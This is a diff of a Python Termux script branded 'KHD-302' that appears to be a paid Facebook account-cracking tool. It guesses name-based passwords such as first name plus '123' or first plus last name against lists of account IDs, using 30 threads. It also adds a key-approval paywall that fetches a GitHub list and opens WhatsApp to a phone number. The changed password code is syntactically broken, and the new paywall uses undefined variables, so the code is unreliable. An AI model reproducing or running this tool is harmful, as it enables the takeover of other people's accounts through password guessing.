@@ -1,11 +1,6 @@
 W = '\033[97;1m'
 R = '\033[91;1m'
 G = '\033[92;1m'
-Y = '\033[93;1m'
-B = '\033[94;1m'
-P = '\033[95;1m'
-C = '\033[96;1m'
-N = '\x1b[0m'
 import os
 try:
 	import requests
@@ -217,7 +212,7 @@ def setting():
 	passmenu()
 def passmenu():
 	clear()
-	print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] All Name+ password')
+	print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] FULL NAME PASS')
 	passmen=input('\n [#] Select Pass : ')
 	if passmen in ['1','01']:
 		first()
@@ -281,23 +276,13 @@ def name2():
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			frs = nmf.split(' ')[0]
+			frs = nmf.split(' ')[0],last=nmf.split(' ')[1]
 			pwv = ['445566']
-			if len(nmf)<6:
-				if len(frs)<3:
+			if len(nmf):
+				if len(frs +last):
 					pass
 				else:
-					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
-			else:
-				if len(frs)<3:
-					pwv.append(nmf)
-				else:
-					pwv.append(nmf)
-					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'786')
+					pwv.append(frs+last)
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
@@ -394,14 +379,14 @@ logo = """
  
     
 
-888    d8P  888         888   8888888b.        
-888   d8P   888         888   888   "Y88b       
-888  d8P    888         888   888     888           
-888d88K     888888888888888   888     888    
-8888888b    888         888   888     888      
-888  Y88b   888.        888   888     888      
-888   Y88b  888         888   888  . d88P       
-888    Y88b 888         888.  8888888P"      
+888    d8P   888       888    8888888b.        
+888   d8P    888       888    888   "Y88b       
+888  d8P     888       888    888     888           
+888d88K      8888888888888    888     888    
+8888888b     888       888    888     888      
+888  Y88b    888.      888    888     888      
+888   Y88b   888       888    888  . d88P       
+888    Y88b  888       888.   8888888P" 302
                                                                                
 \x1b[1;97m--------------------------------------------------
 \33[1;41mKHD-302 X RSU BRAND REAL FATHER OF HITTLER\33[0m
@@ -424,7 +409,7 @@ class Main:
 		print(logo)
 		print("")
 		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
-		print("\033[1;37mNOTE : Approval LIKE FB PAGE ")
+		print("\033[1;37mNOTE : ANY PROBLEM TO CONTECT ON FB PAGE ")
 		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ")
 		
 		
@@ -1344,5 +1329,37 @@ if len(sys.argv) == 2:
 try:Main()
 except Exception as e:exit(str(e))
  
-
+def Subscraption():
+	key1=open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
+	clear()
+	print(logo)
+	r1=requests.get("https://raw.githubusercontent.com/khdfounder/khdxrsu/main/aproval.txt").text
+	if key1 in r1:
+		os.system('clear')
+		print(logo)
+		Main()
+	else:
+		os.system("clear")
+		print(logo)
+		print("\t \033[1;32m First Get Approvel\033[1;37m ")
+		time.sleep(1)
+		os.system("clear")
+		print(logo)
+		print ("")
+		print(" \033[1;32mKHD 302 Paid TOOL You Need Get Approved First\033[1;37m\n")
+		print ("")
+		print(" Your Key is Not Approved ")
+		print("")
+		print(" Copy And Send Key To Admin")
+		print ("")
+		print (" Your Key : "+ak+khd+key1)
+		print ("")
+		name = input(" Your Name : ")
+		print ("")
+		input(" Press Enter To Send Key")
+		time.sleep(3.5)
+		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
+		os.system('am start https://wa.me/+923185778830?text=' + tks)
+		Subscraption()        
+Main()
 	
